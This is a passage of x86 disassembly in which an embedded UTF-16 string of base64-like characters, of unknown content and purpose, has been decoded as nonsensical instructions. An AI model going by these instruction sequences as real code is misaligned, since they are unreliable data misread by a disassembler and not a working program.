  406235:	49                   	dec    %ecx
  406236:	00 62 00             	add    %ah,0x0(%edx)
  406239:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40623d:	45                   	inc    %ebp
  40623e:	00 68 00             	add    %ch,0x0(%eax)
  406241:	61                   	popa
  406242:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  406246:	00 7a 00             	add    %bh,0x0(%edx)
  406249:	32 00                	xor    (%eax),%al
  40624b:	75 00                	jne    0x40624d
  40624d:	2f                   	das
  40624e:	00 2b                	add    %ch,(%ebx)
  406250:	00 68 00             	add    %ch,0x0(%eax)
  406253:	69 00 49 00 35 00    	imul   $0x350049,(%eax),%eax
  406259:	49                   	dec    %ecx
  40625a:	00 49 00             	add    %cl,0x0(%ecx)
  40625d:	31 00                	xor    %eax,(%eax)
  40625f:	77 00                	ja     0x406261
  406261:	55                   	push   %ebp
  406262:	00 78 00             	add    %bh,0x0(%eax)
  406265:	71 00                	jno    0x406267
  406267:	6c                   	insb   (%dx),%es:(%edi)
  406268:	00 35 00 73 00 50    	add    %dh,0x50007300
  40626e:	00 2b                	add    %ch,(%ebx)
  406270:	00 4f 00             	add    %cl,0x0(%edi)
  406273:	44                   	inc    %esp
  406274:	00 5a 00             	add    %bl,0x0(%edx)
  406277:	50                   	push   %eax
  406278:	00 65 00             	add    %ah,0x0(%ebp)
  40627b:	75 00                	jne    0x40627d
  40627d:	41                   	inc    %ecx
  40627e:	00 72 00             	add    %dh,0x0(%edx)
  406281:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  406285:	39 00                	cmp    %eax,(%eax)
  406287:	32 00                	xor    (%eax),%al
  406289:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40628d:	77 00                	ja     0x40628f
  40628f:	33 00                	xor    (%eax),%eax
  406291:	52                   	push   %edx
  406292:	00 73 00             	add    %dh,0x0(%ebx)
  406295:	61                   	popa
  406296:	00 59 00             	add    %bl,0x0(%ecx)
  406299:	47                   	inc    %edi
  40629a:	00 36                	add    %dh,(%esi)
  40629c:	00 6e 00             	add    %ch,0x0(%esi)
  40629f:	6e                   	outsb  %ds:(%esi),(%dx)
  4062a0:	00 47 00             	add    %al,0x0(%edi)
  4062a3:	31 00                	xor    %eax,(%eax)
  4062a5:	58                   	pop    %eax
  4062a6:	00 76 00             	add    %dh,0x0(%esi)
  4062a9:	76 00                	jbe    0x4062ab
  4062ab:	70 00                	jo     0x4062ad
  4062ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4062ae:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  4062b2:	00 58 00             	add    %bl,0x0(%eax)
  4062b5:	61                   	popa
  4062b6:	00 61 00             	add    %ah,0x0(%ecx)
  4062b9:	47                   	inc    %edi
  4062ba:	00 76 00             	add    %dh,0x0(%esi)
  4062bd:	75 00                	jne    0x4062bf
  4062bf:	6b 00 52             	imul   $0x52,(%eax),%eax
  4062c2:	00 68 00             	add    %ch,0x0(%eax)
  4062c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4062c6:	00 67 00             	add    %ah,0x0(%edi)
  4062c9:	33 00                	xor    (%eax),%eax
  4062cb:	4b                   	dec    %ebx
  4062cc:	00 32                	add    %dh,(%edx)
  4062ce:	00 35 00 66 00 47    	add    %dh,0x47006600
  4062d4:	00 53 00             	add    %dl,0x0(%ebx)
  4062d7:	6d                   	insl   (%dx),%es:(%edi)
  4062d8:	00 50 00             	add    %dl,0x0(%eax)
  4062db:	33 00                	xor    (%eax),%eax
  4062dd:	43                   	inc    %ebx
  4062de:	00 67 00             	add    %ah,0x0(%edi)
  4062e1:	75 00                	jne    0x4062e3
  4062e3:	34 00                	xor    $0x0,%al
  4062e5:	33 00                	xor    (%eax),%eax
  4062e7:	32 00                	xor    (%eax),%al
  4062e9:	4d                   	dec    %ebp
  4062ea:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  4062ee:	00 30                	add    %dh,(%eax)
  4062f0:	00 61 00             	add    %ah,0x0(%ecx)
  4062f3:	51                   	push   %ecx
  4062f4:	00 55 00             	add    %dl,0x0(%ebp)
  4062f7:	4a                   	dec    %edx
  4062f8:	00 2b                	add    %ch,(%ebx)
  4062fa:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  4062fe:	00 67 00             	add    %ah,0x0(%edi)
  406301:	6c                   	insb   (%dx),%es:(%edi)
  406302:	00 34 00             	add    %dh,(%eax,%eax,1)
  406305:	48                   	dec    %eax
  406306:	00 2b                	add    %ch,(%ebx)
  406308:	00 6a 00             	add    %ch,0x0(%edx)
  40630b:	65 00 38             	add    %bh,%gs:(%eax)
  40630e:	00 33                	add    %dh,(%ebx)
  406310:	00 4e 00             	add    %cl,0x0(%esi)
  406313:	74 00                	je     0x406315
  406315:	46                   	inc    %esi
  406316:	00 41 00             	add    %al,0x0(%ecx)
  406319:	4b                   	dec    %ebx
  40631a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40631d:	63 00                	arpl   %eax,(%eax)
  40631f:	49                   	dec    %ecx
  406320:	00 66 00             	add    %ah,0x0(%esi)
  406323:	46                   	inc    %esi
  406324:	00 34 00             	add    %dh,(%eax,%eax,1)
  406327:	74 00                	je     0x406329
  406329:	70 00                	jo     0x40632b
  40632b:	34 00                	xor    $0x0,%al
  40632d:	4e                   	dec    %esi
  40632e:	00 77 00             	add    %dh,0x0(%edi)
  406331:	69 00 65 00 69 00    	imul   $0x690065,(%eax),%eax
  406337:	79 00                	jns    0x406339
  406339:	6b 00 74             	imul   $0x74,(%eax),%eax
  40633c:	00 32                	add    %dh,(%edx)
  40633e:	00 4d 00             	add    %cl,0x0(%ebp)
  406341:	58                   	pop    %eax
  406342:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  406346:	00 42 00             	add    %al,0x0(%edx)
  406349:	64 00 44 00 49       	add    %al,%fs:0x49(%eax,%eax,1)
  40634e:	00 59 00             	add    %bl,0x0(%ecx)
  406351:	4b                   	dec    %ebx
  406352:	00 47 00             	add    %al,0x0(%edi)
  406355:	33 00                	xor    (%eax),%eax
  406357:	79 00                	jns    0x406359
  406359:	33 00                	xor    (%eax),%eax
  40635b:	58                   	pop    %eax
  40635c:	00 47 00             	add    %al,0x0(%edi)
  40635f:	48                   	dec    %eax
  406360:	00 59 00             	add    %bl,0x0(%ecx)
  406363:	75 00                	jne    0x406365
  406365:	38 00                	cmp    %al,(%eax)
  406367:	4d                   	dec    %ebp
  406368:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40636c:	00 70 00             	add    %dh,0x0(%eax)
  40636f:	2f                   	das
  406370:	00 35 00 56 00 36    	add    %dh,0x36005600
  406376:	00 42 00             	add    %al,0x0(%edx)
  406379:	6e                   	outsb  %ds:(%esi),(%dx)
  40637a:	00 46 00             	add    %al,0x0(%esi)
  40637d:	73 00                	jae    0x40637f
  40637f:	78 00                	js     0x406381
  406381:	47                   	inc    %edi
  406382:	00 62 00             	add    %ah,0x0(%edx)
  406385:	44                   	inc    %esp
  406386:	00 6f 00             	add    %ch,0x0(%edi)
  406389:	75 00                	jne    0x40638b
  40638b:	6e                   	outsb  %ds:(%esi),(%dx)
  40638c:	00 48 00             	add    %cl,0x0(%eax)
  40638f:	50                   	push   %eax
  406390:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  406394:	00 45 00             	add    %al,0x0(%ebp)
  406397:	31 00                	xor    %eax,(%eax)
  406399:	42                   	inc    %edx
  40639a:	00 69 00             	add    %ch,0x0(%ecx)
  40639d:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  4063a1:	56                   	push   %esi
  4063a2:	00 42 00             	add    %al,0x0(%edx)
  4063a5:	6c                   	insb   (%dx),%es:(%edi)
  4063a6:	00 55 00             	add    %dl,0x0(%ebp)
  4063a9:	45                   	inc    %ebp
  4063aa:	00 31                	add    %dh,(%ecx)
  4063ac:	00 57 00             	add    %dl,0x0(%edi)
  4063af:	46                   	inc    %esi
  4063b0:	00 4b 00             	add    %cl,0x0(%ebx)
  4063b3:	32 00                	xor    (%eax),%al
  4063b5:	55                   	push   %ebp
  4063b6:	00 47 00             	add    %al,0x0(%edi)
  4063b9:	4a                   	dec    %edx
  4063ba:	00 4b 00             	add    %cl,0x0(%ebx)
  4063bd:	61                   	popa
  4063be:	00 58 00             	add    %bl,0x0(%eax)
  4063c1:	5a                   	pop    %edx
  4063c2:	00 73 00             	add    %dh,0x0(%ebx)
  4063c5:	2b 00                	sub    (%eax),%eax
  4063c7:	47                   	inc    %edi
  4063c8:	00 41 00             	add    %al,0x0(%ecx)
  4063cb:	6c                   	insb   (%dx),%es:(%edi)
  4063cc:	00 43 00             	add    %al,0x0(%ebx)
  4063cf:	33 00                	xor    (%eax),%eax
  4063d1:	6c                   	insb   (%dx),%es:(%edi)
  4063d2:	00 58 00             	add    %bl,0x0(%eax)
  4063d5:	79 00                	jns    0x4063d7
  4063d7:	54                   	push   %esp
  4063d8:	00 79 00             	add    %bh,0x0(%ecx)
  4063db:	39 00                	cmp    %eax,(%eax)
  4063dd:	45                   	inc    %ebp
  4063de:	00 57 00             	add    %dl,0x0(%edi)
  4063e1:	5a                   	pop    %edx
  4063e2:	00 35 00 4f 00 48    	add    %dh,0x48004f00
  4063e8:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  4063ec:	00 72 00             	add    %dh,0x0(%edx)
  4063ef:	64 00 39             	add    %bh,%fs:(%ecx)
  4063f2:	00 48 00             	add    %cl,0x0(%eax)
  4063f5:	70 00                	jo     0x4063f7
  4063f7:	73 00                	jae    0x4063f9
  4063f9:	7a 00                	jp     0x4063fb
  4063fb:	30 00                	xor    %al,(%eax)
  4063fd:	56                   	push   %esi
  4063fe:	00 65 00             	add    %ah,0x0(%ebp)
  406401:	34 00                	xor    $0x0,%al
  406403:	7a 00                	jp     0x406405
  406405:	45                   	inc    %ebp
  406406:	00 33                	add    %dh,(%ebx)
  406408:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40640c:	00 46 00             	add    %al,0x0(%esi)
  40640f:	70 00                	jo     0x406411
  406411:	50                   	push   %eax
  406412:	00 67 00             	add    %ah,0x0(%edi)
  406415:	47                   	inc    %edi
  406416:	00 31                	add    %dh,(%ecx)
  406418:	00 6b 00             	add    %ch,0x0(%ebx)
  40641b:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40641f:	56                   	push   %esi
  406420:	00 56 00             	add    %dl,0x0(%esi)
  406423:	4a                   	dec    %edx
  406424:	00 76 00             	add    %dh,0x0(%esi)
  406427:	7a 00                	jp     0x406429
  406429:	72 00                	jb     0x40642b
  40642b:	65 00 44 00 70       	add    %al,%gs:0x70(%eax,%eax,1)
  406430:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  406434:	00 6e 00             	add    %ch,0x0(%esi)
  406437:	37                   	aaa
  406438:	00 66 00             	add    %ah,0x0(%esi)
  40643b:	73 00                	jae    0x40643d
  40643d:	6b 00 51             	imul   $0x51,(%eax),%eax
  406440:	00 5a 00             	add    %bl,0x0(%edx)
  406443:	43                   	inc    %ebx
  406444:	00 79 00             	add    %bh,0x0(%ecx)
  406447:	63 00                	arpl   %eax,(%eax)
  406449:	4c                   	dec    %esp
  40644a:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40644e:	00 69 00             	add    %ch,0x0(%ecx)
  406451:	6f                   	outsl  %ds:(%esi),(%dx)
  406452:	00 7a 00             	add    %bh,0x0(%edx)
  406455:	56                   	push   %esi
  406456:	00 61 00             	add    %ah,0x0(%ecx)
  406459:	69 00 31 00 4d 00    	imul   $0x4d0031,(%eax),%eax
  40645f:	77 00                	ja     0x406461
  406461:	4c                   	dec    %esp
  406462:	00 61 00             	add    %ah,0x0(%ecx)
  406465:	54                   	push   %esp
  406466:	00 35 00 74 00 4e    	add    %dh,0x4e007400
  40646c:	00 49 00             	add    %cl,0x0(%ecx)
  40646f:	61                   	popa
  406470:	00 2b                	add    %ch,(%ebx)
  406472:	00 4b 00             	add    %cl,0x0(%ebx)
  406475:	30 00                	xor    %al,(%eax)
  406477:	46                   	inc    %esi
  406478:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40647c:	00 45 00             	add    %al,0x0(%ebp)
  40647f:	36 00 2f             	add    %ch,%ss:(%edi)
  406482:	00 76 00             	add    %dh,0x0(%esi)
  406485:	46                   	inc    %esi
  406486:	00 34 00             	add    %dh,(%eax,%eax,1)
  406489:	4f                   	dec    %edi
  40648a:	00 77 00             	add    %dh,0x0(%edi)
  40648d:	53                   	push   %ebx
  40648e:	00 37                	add    %dh,(%edi)
  406490:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  406494:	00 79 00             	add    %bh,0x0(%ecx)
  406497:	70 00                	jo     0x406499
  406499:	32 00                	xor    (%eax),%al
  40649b:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40649e:	00 79 00             	add    %bh,0x0(%ecx)
  4064a1:	70 00                	jo     0x4064a3
  4064a3:	52                   	push   %edx
  4064a4:	00 73 00             	add    %dh,0x0(%ebx)
  4064a7:	4a                   	dec    %edx
  4064a8:	00 6e 00             	add    %ch,0x0(%esi)
  4064ab:	4d                   	dec    %ebp
  4064ac:	00 66 00             	add    %ah,0x0(%esi)
  4064af:	67 00 33             	add    %dh,(%bp,%di)
  4064b2:	00 42 00             	add    %al,0x0(%edx)
  4064b5:	74 00                	je     0x4064b7
  4064b7:	6b 00 48             	imul   $0x48,(%eax),%eax
  4064ba:	00 62 00             	add    %ah,0x0(%edx)
  4064bd:	5a                   	pop    %edx
  4064be:	00 45 00             	add    %al,0x0(%ebp)
  4064c1:	30 00                	xor    %al,(%eax)
  4064c3:	35 00 34 00 41       	xor    $0x41003400,%eax
  4064c8:	00 5a 00             	add    %bl,0x0(%edx)
  4064cb:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  4064cf:	47                   	inc    %edi
  4064d0:	00 50 00             	add    %dl,0x0(%eax)
  4064d3:	74 00                	je     0x4064d5
  4064d5:	75 00                	jne    0x4064d7
  4064d7:	61                   	popa
  4064d8:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  4064dc:	00 58 00             	add    %bl,0x0(%eax)
  4064df:	4e                   	dec    %esi
  4064e0:	00 32                	add    %dh,(%edx)
  4064e2:	00 79 00             	add    %bh,0x0(%ecx)
  4064e5:	55                   	push   %ebp
  4064e6:	00 52 00             	add    %dl,0x0(%edx)
  4064e9:	6c                   	insb   (%dx),%es:(%edi)
  4064ea:	00 63 00             	add    %ah,0x0(%ebx)
  4064ed:	55                   	push   %ebp
  4064ee:	00 48 00             	add    %cl,0x0(%eax)
  4064f1:	51                   	push   %ecx
  4064f2:	00 69 00             	add    %ch,0x0(%ecx)
  4064f5:	55                   	push   %ebp
  4064f6:	00 51 00             	add    %dl,0x0(%ecx)
  4064f9:	78 00                	js     0x4064fb
  4064fb:	37                   	aaa
  4064fc:	00 39                	add    %bh,(%ecx)
  4064fe:	00 39                	add    %bh,(%ecx)
  406500:	00 55 00             	add    %dl,0x0(%ebp)
  406503:	72 00                	jb     0x406505
  406505:	51                   	push   %ecx
  406506:	00 73 00             	add    %dh,0x0(%ebx)
  406509:	51                   	push   %ecx
  40650a:	00 30                	add    %dh,(%eax)
  40650c:	00 38                	add    %bh,(%eax)
  40650e:	00 52 00             	add    %dl,0x0(%edx)
  406511:	37                   	aaa
  406512:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  406516:	00 4b 00             	add    %cl,0x0(%ebx)
  406519:	72 00                	jb     0x40651b
  40651b:	4e                   	dec    %esi
  40651c:	00 59 00             	add    %bl,0x0(%ecx)
  40651f:	59                   	pop    %ecx
  406520:	00 65 00             	add    %ah,0x0(%ebp)
  406523:	46                   	inc    %esi
  406524:	00 7a 00             	add    %bh,0x0(%edx)
  406527:	49                   	dec    %ecx
  406528:	00 76 00             	add    %dh,0x0(%esi)
  40652b:	74 00                	je     0x40652d
  40652d:	55                   	push   %ebp
  40652e:	00 36                	add    %dh,(%esi)
  406530:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  406534:	00 58 00             	add    %bl,0x0(%eax)
  406537:	39 00                	cmp    %eax,(%eax)
  406539:	34 00                	xor    $0x0,%al
  40653b:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40653f:	49                   	dec    %ecx
  406540:	00 6d 00             	add    %ch,0x0(%ebp)
  406543:	35 00 6c 00 4e       	xor    $0x4e006c00,%eax
  406548:	00 70 00             	add    %dh,0x0(%eax)
  40654b:	78 00                	js     0x40654d
  40654d:	6d                   	insl   (%dx),%es:(%edi)
  40654e:	00 31                	add    %dh,(%ecx)
  406550:	00 79 00             	add    %bh,0x0(%ecx)
  406553:	72 00                	jb     0x406555
  406555:	75 00                	jne    0x406557
  406557:	69 00 41 00 70 00    	imul   $0x700041,(%eax),%eax
  40655d:	45                   	inc    %ebp
  40655e:	00 30                	add    %dh,(%eax)
  406560:	00 56 00             	add    %dl,0x0(%esi)
  406563:	54                   	push   %esp
  406564:	00 73 00             	add    %dh,0x0(%ebx)
  406567:	37                   	aaa
  406568:	00 46 00             	add    %al,0x0(%esi)
  40656b:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40656f:	57                   	push   %edi
  406570:	00 51 00             	add    %dl,0x0(%ecx)
  406573:	49                   	dec    %ecx
  406574:	00 30                	add    %dh,(%eax)
  406576:	00 2b                	add    %ch,(%ebx)
  406578:	00 69 00             	add    %ch,0x0(%ecx)
  40657b:	56                   	push   %esi
  40657c:	00 31                	add    %dh,(%ecx)
  40657e:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  406582:	00 53 00             	add    %dl,0x0(%ebx)
  406585:	7a 00                	jp     0x406587
  406587:	6d                   	insl   (%dx),%es:(%edi)
  406588:	00 76 00             	add    %dh,0x0(%esi)
  40658b:	42                   	inc    %edx
  40658c:	00 56 00             	add    %dl,0x0(%esi)
  40658f:	70 00                	jo     0x406591
  406591:	57                   	push   %edi
  406592:	00 6d 00             	add    %ch,0x0(%ebp)
  406595:	53                   	push   %ebx
  406596:	00 78 00             	add    %bh,0x0(%eax)
  406599:	37                   	aaa
  40659a:	00 77 00             	add    %dh,0x0(%edi)
  40659d:	4a                   	dec    %edx
  40659e:	00 6b 00             	add    %ch,0x0(%ebx)
  4065a1:	79 00                	jns    0x4065a3
  4065a3:	48                   	dec    %eax
  4065a4:	00 38                	add    %bh,(%eax)
  4065a6:	00 33                	add    %dh,(%ebx)
  4065a8:	00 75 00             	add    %dh,0x0(%ebp)
  4065ab:	71 00                	jno    0x4065ad
  4065ad:	78 00                	js     0x4065af
  4065af:	32 00                	xor    (%eax),%al
  4065b1:	63 00                	arpl   %eax,(%eax)
  4065b3:	5a                   	pop    %edx
  4065b4:	00 47 00             	add    %al,0x0(%edi)
  4065b7:	4b                   	dec    %ebx
  4065b8:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  4065bc:	00 6d 00             	add    %ch,0x0(%ebp)
  4065bf:	76 00                	jbe    0x4065c1
  4065c1:	4f                   	dec    %edi
  4065c2:	00 58 00             	add    %bl,0x0(%eax)
  4065c5:	38 00                	cmp    %al,(%eax)
  4065c7:	73 00                	jae    0x4065c9
  4065c9:	32 00                	xor    (%eax),%al
  4065cb:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  4065cf:	56                   	push   %esi
  4065d0:	00 4f 00             	add    %cl,0x0(%edi)
  4065d3:	52                   	push   %edx
  4065d4:	00 77 00             	add    %dh,0x0(%edi)
  4065d7:	5a                   	pop    %edx
  4065d8:	00 35 00 2f 00 2f    	add    %dh,0x2f002f00
  4065de:	00 65 00             	add    %ah,0x0(%ebp)
  4065e1:	4a                   	dec    %edx
  4065e2:	00 75 00             	add    %dh,0x0(%ebp)
  4065e5:	56                   	push   %esi
  4065e6:	00 48 00             	add    %cl,0x0(%eax)
  4065e9:	57                   	push   %edi
  4065ea:	00 35 00 51 00 79    	add    %dh,0x79005100
  4065f0:	00 41 00             	add    %al,0x0(%ecx)
  4065f3:	4e                   	dec    %esi
  4065f4:	00 53 00             	add    %dl,0x0(%ebx)
  4065f7:	34 00                	xor    $0x0,%al
  4065f9:	30 00                	xor    %al,(%eax)
  4065fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4065fc:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  406600:	00 56 00             	add    %dl,0x0(%esi)
  406603:	4b                   	dec    %ebx
  406604:	00 70 00             	add    %dh,0x0(%eax)
  406607:	4b                   	dec    %ebx
  406608:	00 47 00             	add    %al,0x0(%edi)
  40660b:	41                   	inc    %ecx
  40660c:	00 33                	add    %dh,(%ebx)
  40660e:	00 36                	add    %dh,(%esi)
  406610:	00 77 00             	add    %dh,0x0(%edi)
  406613:	79 00                	jns    0x406615
  406615:	4f                   	dec    %edi
  406616:	00 62 00             	add    %ah,0x0(%edx)
  406619:	41                   	inc    %ecx
  40661a:	00 77 00             	add    %dh,0x0(%edi)
  40661d:	45                   	inc    %ebp
  40661e:	00 69 00             	add    %ch,0x0(%ecx)
  406621:	54                   	push   %esp
  406622:	00 5a 00             	add    %bl,0x0(%edx)
  406625:	68 00 4c 00 67       	push   $0x67004c00
  40662a:	00 32                	add    %dh,(%edx)
  40662c:	00 4f 00             	add    %cl,0x0(%edi)
  40662f:	76 00                	jbe    0x406631
  406631:	69 00 58 00 46 00    	imul   $0x460058,(%eax),%eax
  406637:	48                   	dec    %eax
  406638:	00 79 00             	add    %bh,0x0(%ecx)
  40663b:	78 00                	js     0x40663d
  40663d:	33 00                	xor    (%eax),%eax
  40663f:	30 00                	xor    %al,(%eax)
  406641:	51                   	push   %ecx
  406642:	00 41 00             	add    %al,0x0(%ecx)
  406645:	6d                   	insl   (%dx),%es:(%edi)
  406646:	00 42 00             	add    %al,0x0(%edx)
  406649:	57                   	push   %edi
  40664a:	00 75 00             	add    %dh,0x0(%ebp)
  40664d:	67 00 42 00          	add    %al,0x0(%bp,%si)
  406651:	7a 00                	jp     0x406653
  406653:	2b 00                	sub    (%eax),%eax
  406655:	2f                   	das
  406656:	00 34 00             	add    %dh,(%eax,%eax,1)
  406659:	35 00 6b 00 44       	xor    $0x44006b00,%eax
  40665e:	00 2f                	add    %ch,(%edi)
  406660:	00 69 00             	add    %ch,0x0(%ecx)
  406663:	35 00 52 00 59       	xor    $0x59005200,%eax
  406668:	00 30                	add    %dh,(%eax)
  40666a:	00 70 00             	add    %dh,0x0(%eax)
  40666d:	63 00                	arpl   %eax,(%eax)
  40666f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  406673:	78 00                	js     0x406675
  406675:	62 00                	bound  %eax,(%eax)
  406677:	53                   	push   %ebx
  406678:	00 4b 00             	add    %cl,0x0(%ebx)
  40667b:	42                   	inc    %edx
  40667c:	00 68 00             	add    %ch,0x0(%eax)
  40667f:	6a 00                	push   $0x0
  406681:	76 00                	jbe    0x406683
  406683:	67 00 2f             	add    %ch,(%bx)
  406686:	00 5a 00             	add    %bl,0x0(%edx)
  406689:	4a                   	dec    %edx
  40668a:	00 71 00             	add    %dh,0x0(%ecx)
  40668d:	5a                   	pop    %edx
  40668e:	00 72 00             	add    %dh,0x0(%edx)
  406691:	69 00 79 00 53 00    	imul   $0x530079,(%eax),%eax
  406697:	77 00                	ja     0x406699
  406699:	38 00                	cmp    %al,(%eax)
  40669b:	48                   	dec    %eax
  40669c:	00 42 00             	add    %al,0x0(%edx)
  40669f:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  4066a3:	71 00                	jno    0x4066a5
  4066a5:	62 00                	bound  %eax,(%eax)
  4066a7:	75 00                	jne    0x4066a9
  4066a9:	37                   	aaa
  4066aa:	00 36                	add    %dh,(%esi)
  4066ac:	00 52 00             	add    %dl,0x0(%edx)
  4066af:	42                   	inc    %edx
  4066b0:	00 41 00             	add    %al,0x0(%ecx)
  4066b3:	2f                   	das
  4066b4:	00 61 00             	add    %ah,0x0(%ecx)
  4066b7:	7a 00                	jp     0x4066b9
  4066b9:	4b                   	dec    %ebx
  4066ba:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  4066be:	00 6e 00             	add    %ch,0x0(%esi)
  4066c1:	58                   	pop    %eax
  4066c2:	00 4a 00             	add    %cl,0x0(%edx)
  4066c5:	2b 00                	sub    (%eax),%eax
  4066c7:	6a 00                	push   $0x0
  4066c9:	5a                   	pop    %edx
  4066ca:	00 70 00             	add    %dh,0x0(%eax)
  4066cd:	61                   	popa
  4066ce:	00 67 00             	add    %ah,0x0(%edi)
  4066d1:	68 00 4d 00 39       	push   $0x39004d00
  4066d6:	00 5a 00             	add    %bl,0x0(%edx)
  4066d9:	68 00 4f 00 35       	push   $0x35004f00
  4066de:	00 63 00             	add    %ah,0x0(%ebx)
  4066e1:	6a 00                	push   $0x0
  4066e3:	32 00                	xor    (%eax),%al
  4066e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4066e6:	00 41 00             	add    %al,0x0(%ecx)
  4066e9:	45                   	inc    %ebp
  4066ea:	00 6d 00             	add    %ch,0x0(%ebp)
  4066ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4066ee:	00 6f 00             	add    %ch,0x0(%edi)
  4066f1:	4d                   	dec    %ebp
  4066f2:	00 7a 00             	add    %bh,0x0(%edx)
  4066f5:	59                   	pop    %ecx
  4066f6:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  4066fa:	00 42 00             	add    %al,0x0(%edx)
  4066fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4066fe:	00 5a 00             	add    %bl,0x0(%edx)
  406701:	48                   	dec    %eax
  406702:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  406706:	00 30                	add    %dh,(%eax)
  406708:	00 6b 00             	add    %ch,0x0(%ebx)
  40670b:	72 00                	jb     0x40670d
  40670d:	4c                   	dec    %esp
  40670e:	00 42 00             	add    %al,0x0(%edx)
  406711:	53                   	push   %ebx
  406712:	00 52 00             	add    %dl,0x0(%edx)
  406715:	74 00                	je     0x406717
  406717:	51                   	push   %ecx
  406718:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40671c:	00 41 00             	add    %al,0x0(%ecx)
  40671f:	56                   	push   %esi
  406720:	00 51 00             	add    %dl,0x0(%ecx)
  406723:	33 00                	xor    (%eax),%eax
  406725:	50                   	push   %eax
  406726:	00 47 00             	add    %al,0x0(%edi)
  406729:	36 00 6c 00 70       	add    %ch,%ss:0x70(%eax,%eax,1)
  40672e:	00 78 00             	add    %bh,0x0(%eax)
  406731:	58                   	pop    %eax
  406732:	00 56 00             	add    %dl,0x0(%esi)
  406735:	42                   	inc    %edx
  406736:	00 6d 00             	add    %ch,0x0(%ebp)
  406739:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40673d:	43                   	inc    %ebx
  40673e:	00 56 00             	add    %dl,0x0(%esi)
  406741:	41                   	inc    %ecx
  406742:	00 47 00             	add    %al,0x0(%edi)
  406745:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  406749:	50                   	push   %eax
  40674a:	00 67 00             	add    %ah,0x0(%edi)
  40674d:	78 00                	js     0x40674f
  40674f:	32 00                	xor    (%eax),%al
  406751:	55                   	push   %ebp
  406752:	00 65 00             	add    %ah,0x0(%ebp)
  406755:	4b                   	dec    %ebx
  406756:	00 30                	add    %dh,(%eax)
  406758:	00 4b 00             	add    %cl,0x0(%ebx)
  40675b:	6d                   	insl   (%dx),%es:(%edi)
  40675c:	00 72 00             	add    %dh,0x0(%edx)
  40675f:	6d                   	insl   (%dx),%es:(%edi)
  406760:	00 77 00             	add    %dh,0x0(%edi)
  406763:	69 00 2b 00 67 00    	imul   $0x67002b,(%eax),%eax
  406769:	30 00                	xor    %al,(%eax)
  40676b:	52                   	push   %edx
  40676c:	00 2f                	add    %ch,(%edi)
  40676e:	00 56 00             	add    %dl,0x0(%esi)
  406771:	4e                   	dec    %esi
  406772:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  406776:	00 41 00             	add    %al,0x0(%ecx)
  406779:	41                   	inc    %ecx
  40677a:	00 35 00 7a 00 66    	add    %dh,0x66007a00
  406780:	00 4d 00             	add    %cl,0x0(%ebp)
  406783:	33 00                	xor    (%eax),%eax
  406785:	4c                   	dec    %esp
  406786:	00 72 00             	add    %dh,0x0(%edx)
  406789:	75 00                	jne    0x40678b
  40678b:	52                   	push   %edx
  40678c:	00 6f 00             	add    %ch,0x0(%edi)
  40678f:	49                   	dec    %ecx
  406790:	00 4d 00             	add    %cl,0x0(%ebp)
  406793:	6e                   	outsb  %ds:(%esi),(%dx)
  406794:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  406798:	00 4b 00             	add    %cl,0x0(%ebx)
  40679b:	4e                   	dec    %esi
  40679c:	00 79 00             	add    %bh,0x0(%ecx)
  40679f:	55                   	push   %ebp
  4067a0:	00 39                	add    %bh,(%ecx)
  4067a2:	00 6d 00             	add    %ch,0x0(%ebp)
  4067a5:	79 00                	jns    0x4067a7
  4067a7:	6c                   	insb   (%dx),%es:(%edi)
  4067a8:	00 45 00             	add    %al,0x0(%ebp)
  4067ab:	6d                   	insl   (%dx),%es:(%edi)
  4067ac:	00 31                	add    %dh,(%ecx)
  4067ae:	00 2f                	add    %ch,(%edi)
  4067b0:	00 35 00 4b 00 72    	add    %dh,0x72004b00
  4067b6:	00 4d 00             	add    %cl,0x0(%ebp)
  4067b9:	78 00                	js     0x4067bb
  4067bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4067bc:	00 77 00             	add    %dh,0x0(%edi)
  4067bf:	6d                   	insl   (%dx),%es:(%edi)
